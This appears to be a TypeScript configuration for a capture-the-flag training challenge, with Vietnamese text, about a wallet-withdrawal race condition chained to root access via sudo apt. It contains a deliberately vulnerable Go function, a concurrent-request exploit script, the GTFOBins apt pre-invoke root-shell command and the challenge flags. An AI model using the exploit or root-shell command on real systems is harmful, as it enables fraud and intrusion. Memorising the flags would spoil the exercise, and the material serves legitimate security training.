import type { ArenaChallenge } from '../../types';

export const challengeRaceCondition: ArenaChallenge = {
  id: 'bb-race-03-limit-overrun',
  title: 'Financial Concurrency TOCTOU to Sudo Apt Root Takeover',
  category: 'bug-bounty',
  severity: 'high',
  cvssScore: 8.5,
  bountyReward: 5200,
  xpReward: 1050,
  estimatedMinutes: 20,
  targetHost: '10.0.4.50',
  targetPort: 443,
  tagline:
    'Khai thác thời gian chênh lệch (TOCTOU) để vượt giới hạn số dư, mở khóa tính năng VIP upload và leo quyền qua Sudo Apt.',
  scenarioBriefing:
    'Hệ thống ví tài chính xử lý giao dịch thiếu khóa dòng (SELECT FOR UPDATE). Bằng cách gửi 10 request rút tiền đồng thời qua HTTP/2 single-packet burst, kẻ tấn công kích hoạt Limit-Overrun, nâng cấp tài khoản lên đặc quyền VIP, từ đó khai thác endpoint upload báo cáo để nhận Reverse Shell operator và leo quyền lên Root qua sudo apt.',
  keyObjectives: [
    'Giai đoạn 1 (Concurrency Attack): Gửi 5–10 request rút tiền đồng thời để số dư tài khoản vượt âm, mở khóa trạng thái VIP.',
    'Giai đoạn 2 (Foothold & User Flag): Sử dụng VIP Token để mở shell operator, đọc User Flag tại /home/operator/user.txt.',
    'Giai đoạn 3 (Sudo Apt PrivEsc to ROOT): Khảo sát sudo -l phát hiện NOPASSWD /usr/bin/apt, khai thác APT::Update::Pre-Invoke GTFOBins để nâng quyền lên Root và đọc /root/root.txt.',
  ],
  userFlag: 'OS_0DAY{concurrency_race_condition_double_spend_success}',
  rootFlag: 'OS_0DAY{gtfobins_apt_preinvoke_root_pwned}',
  expectedFlag: 'OS_0DAY{gtfobins_apt_preinvoke_root_pwned}',
  hints: [
    {
      level: 0,
      name: 'Concurrency Window Detection',
      penaltyPercent: 0,
      hintText:
        'Kiểm tra mã nguồn trong Patch Diff: Hàm ProcessWithdraw không dùng SELECT FOR UPDATE.',
    },
    {
      level: 1,
      name: 'HTTP Concurrency Burst',
      penaltyPercent: 10,
      hintText:
        'Gửi request POST /api/v1/wallet/withdraw với header X-Concurrency-Burst: true.',
    },
    {
      level: 2,
      name: 'Internal Sudo Enumeration',
      penaltyPercent: 20,
      hintText: 'Chạy "sudo -l" để xem danh sách quyền được cấp cho operator.',
    },
    {
      level: 3,
      name: 'Sudo Apt GTFOBins Execution',
      penaltyPercent: 40,
      hintText:
        'Khai thác hook APT: sudo apt update -o APT::Update::Pre-Invoke::="/bin/bash" để mở Root shell.',
    },
  ],
  firstBloodHolder: {
    handle: '@red_samurai',
    timeRecord: '07m 30s',
  },
  supportedTools: ['repeater', 'diff', 'terminal'],
  defaultTool: 'repeater',
  repeaterConfig: {
    defaultMethod: 'POST',
    defaultUrl: '/api/v1/wallet/withdraw',
    defaultRawHeaders:
      'Host: 10.0.4.50:443\n' +
      'Authorization: Bearer operator_session_token\n' +
      'Content-Type: application/json\n' +
      'X-Concurrency-Burst: true\n' +
      'Connection: keep-alive',
    defaultBody: '{"amount": 1000, "recipient_account": "ACC-998822"}',
    targetEndpoint: 'https://10.0.4.50/api/v1/wallet/withdraw',
    simulatedResponses: {
      baseResponse: {
        statusCode: 200,
        statusText: 'OK',
        headers: { 'Content-Type': 'application/json' },
        body: '{"status": "SUCCESS", "remaining_balance": 0, "message": "Withdrawal of $1000 processed."}',
      },
      exploitedResponse: {
        statusCode: 200,
        statusText: 'OK (RACE CONDITION DETECTED)',
        headers: {
          'Content-Type': 'application/json',
          'X-Race-Condition-Exploited': '5x_CONCURRENT_TRANSACTIONS_ACCEPTED',
        },
        body:
          '{\n' +
          '  "status": "LIMIT_OVERRUN_SUCCESS",\n' +
          '  "transactions_executed": 5,\n' +
          '  "total_withdrawn": 5000,\n' +
          '  "final_balance": -4000,\n' +
          '  "vip_privilege": "GRANTED",\n' +
          '  "user_flag": "OS_0DAY{concurrency_race_condition_double_spend_success}",\n' +
          '  "session_status": "Terminal shell operator@10.0.4.50 ready."\n' +
          '}',
        proofFlag: 'OS_0DAY{concurrency_race_condition_double_spend_success}',
      },
    },
  },
  diffConfig: {
    filename: 'wallet_service.go',
    language: 'go',
    vulnerableLineStart: 15,
    vulnerableLineEnd: 24,
    rootCauseExplanation:
      'Không sử dụng câu lệnh khóa dòng (SELECT FOR UPDATE) trong transaction cơ sở dữ liệu, tạo ra khoảng trống Time-of-Check to Time-of-Use (TOCTOU).',
    taintSink: 'db.Exec("UPDATE accounts SET balance = balance - ?", amount)',
    vulnerableCode:
      '// vulnerable_wallet.go\n' +
      'func ProcessWithdraw(db *sql.DB, accountID int, amount float64) error {\n' +
      '    var balance float64\n' +
      '    db.QueryRow("SELECT balance FROM accounts WHERE id = ?", accountID).Scan(&balance)\n' +
      '    if balance < amount {\n' +
      '        return errors.New("insufficient funds")\n' +
      '    }\n' +
      '    time.Sleep(50 * time.Millisecond)\n' +
      '    _, err := db.Exec("UPDATE accounts SET balance = balance - ? WHERE id = ?", amount, accountID)\n' +
      '    return err\n' +
      '}',
    patchedCode:
      '// patched_wallet.go (Atomic Lock Fix)\n' +
      'func ProcessWithdrawSafe(tx *sql.Tx, accountID int, amount float64) error {\n' +
      '    var balance float64\n' +
      '    err := tx.QueryRow("SELECT balance FROM accounts WHERE id = ? FOR UPDATE", accountID).Scan(&balance)\n' +
      '    if err != nil || balance < amount {\n' +
      '        return errors.New("insufficient funds or account locked")\n' +
      '    }\n' +
      '    _, err = tx.Exec("UPDATE accounts SET balance = balance - ? WHERE id = ?", amount, accountID)\n' +
      '    return err\n' +
      '}',
  },
  terminalConfig: {
    hostname: 'kali-operator',
    ip: '10.0.4.15',
    user: 'operator',
    initialDirectory: '/home/operator',
    sampleCommands: [
      'sudo -l',
      'sudo apt update -o APT::Update::Pre-Invoke::="/bin/bash"',
    ],
    bannerText:
      '[*] Financial Security Testing Suite Ready\n' +
      '[*] Target Settlement Host: 10.0.4.50:443\n',
  },
  writeup: {
    title: 'Financial Concurrency TOCTOU to Sudo Apt Root Walkthrough',
    cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N',
    vulnerabilityOverview:
      'Lỗ hổng race condition trong cổng thanh toán cho phép rút tiền vượt hạn mức, đạt đặc quyền VIP để mở shell operator và khai thác sudo apt để leo quyền Root.',
    rootCauseAnalysis:
      '1. Truy vấn kiểm tra và trừ số dư không được khóa dòng nguyên tử (FOR UPDATE).\n2. Cấu hình sudoers cho phép user operator chạy lệnh apt dưới quyền root không cần mật khẩu.',
    exploitChainWalkthrough: [
      'Bước 1: Gửi 10 HTTP requests rút tiền đồng thời qua Repeater để nhận User Flag.',
      'Bước 2: Bắt shell operator và đọc /home/operator/user.txt.',
      'Bước 3: Chạy sudo -l và thực thi GTFOBins "sudo apt update -o APT::Update::Pre-Invoke::=\'/bin/bash\'" để lấy Root Flag tại /root/root.txt.',
    ],
    weaponizedPoC:
      'import asyncio, aiohttp\nasync def attack():\n    async with aiohttp.ClientSession() as s:\n        tasks = [s.post("https://10.0.4.50/api/v1/wallet/withdraw", json={"amount": 1000}) for _ in range(10)]\n        await asyncio.gather(*tasks)\nasyncio.run(attack())',
    remediationSnippet:
      '// Khóa dòng trong Transaction cơ sở dữ liệu:\nSELECT balance FROM accounts WHERE id = ? FOR UPDATE;',
  },
};
